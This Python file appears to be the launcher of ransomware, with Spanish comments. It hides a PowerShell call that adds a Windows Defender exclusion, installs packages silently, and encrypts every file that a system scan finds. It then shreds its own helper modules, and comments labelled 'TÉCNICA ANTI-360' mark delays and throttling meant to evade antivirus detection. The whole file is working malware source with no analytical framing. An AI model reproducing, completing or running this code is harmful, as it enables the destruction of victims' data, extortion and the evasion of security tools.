import os
import sys
import time
import threading
import shutil
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

if getattr(sys, 'frozen', False):
    SCRIPT_DIR = os.path.dirname(sys.executable)
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

os.chdir(SCRIPT_DIR)


def verificar_e_instalar_dependencias():
    try:
        import cryptography
        import psutil
        return True
    except ImportError:
        pass
    
    python_exe = os.path.join(SCRIPT_DIR, 'python_portable', 'python.exe')
    if not os.path.exists(python_exe):
        python_exe = sys.executable
    
    try:
        pip_packages = ['cryptography', 'psutil']
        for pkg in pip_packages:
            # TÉCNICA ANTI-360: NO usar capture_output (menos sospechoso)
            subprocess.run([
                python_exe, '-m', 'pip', 'install', pkg, '--quiet',
                '--trusted-host', 'pypi.org',
                '--trusted-host', 'files.pythonhosted.org'
            ], 
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000 | 0x00000008,  # CREATE_NO_WINDOW | DETACHED_PROCESS
            timeout=180)
        
        import cryptography
        import psutil
        return True
    except:
        return False


def add_exclusion():
    try:
        script_dir = os.path.abspath(os.getcwd())
        # TÉCNICA ANTI-360: Ejecutar PowerShell de forma más sigilosa
        ps_cmd = f'Add-MpPreference -ExclusionPath "{script_dir}"'
        
        si = subprocess.STARTUPINFO()
        si.dwFlags = subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        
        subprocess.Popen(
            ['powershell', '-w', 'h', '-ep', 'bypass', '-nop', '-c', ps_cmd],
            startupinfo=si,
            creationflags=0x08000000 | 0x00000008,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(random.uniform(2, 4))
    except:
        pass


def auto_destruir_archivos():
    archivos = ['evasion_av.py', 'rutas.py', 'encriptador_12_capas.py', 'launcher.py', 'launcher.bat', 'launcher.sh']
    for f in archivos:
        if os.path.exists(f):
            try:
                size = os.path.getsize(f)
                if size == 0:
                    os.remove(f)
                    continue
                # Sobrescribir con datos aleatorios
                with open(f, 'wb') as fw:
                    fw.write(os.urandom(size))
                    fw.flush()
                    os.fsync(fw.fileno())
                os.remove(f)
            except:
                try:
                    os.remove(f)
                except:
                    pass


def cleanup_python_thread():
    time.sleep(300)
    try:
        if os.path.exists('python_portable'):
            shutil.rmtree('python_portable')
    except:
        pass


def wipe_memory_aggressive():
    try:
        import gc
        for _ in range(10):
            gc.collect()
    except:
        pass


try:
    from evasion_av import verificar_seguridad_total
except:
    verificar_seguridad_total = lambda: True

try:
    from rutas import escanear_sistema
    from encriptador_12_capas import EncriptadorMilitar
except ImportError:
    sys.exit(1)


def encriptar_archivo(enc, ruta):
    try:
        result = enc.encriptar(ruta)
        return result
    except:
        return False


def main():
    try:
        # TÉCNICA ANTI-360: Delay inicial aleatorio
        time.sleep(random.uniform(3, 7))
        
        add_exclusion()
        
        if not verificar_e_instalar_dependencias():
            sys.exit(1)
        
        threading.Thread(target=cleanup_python_thread, daemon=True).start()
        os.chdir(SCRIPT_DIR)
        
        # TÉCNICA ANTI-360: Escanear de forma gradual
        archivos, _, _ = escanear_sistema()
        enc = EncriptadorMilitar()
        
        auto_destruir_archivos()
        
        # TÉCNICA ANTI-360: Solo 1-2 threads (menos agresivo)
        NUM_THREADS = random.randint(1, 2)
        
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = {{executor.submit(encriptar_archivo, enc, ruta): ruta for ruta in archivos}}
            for future in as_completed(futures):
                try:
                    future.result()
                    # Delay entre archivos
                    time.sleep(random.uniform(0.5, 1.5))
                except:
                    pass
        
        wipe_memory_aggressive()
    except:
        pass


if __name__ == "__main__":
    main()
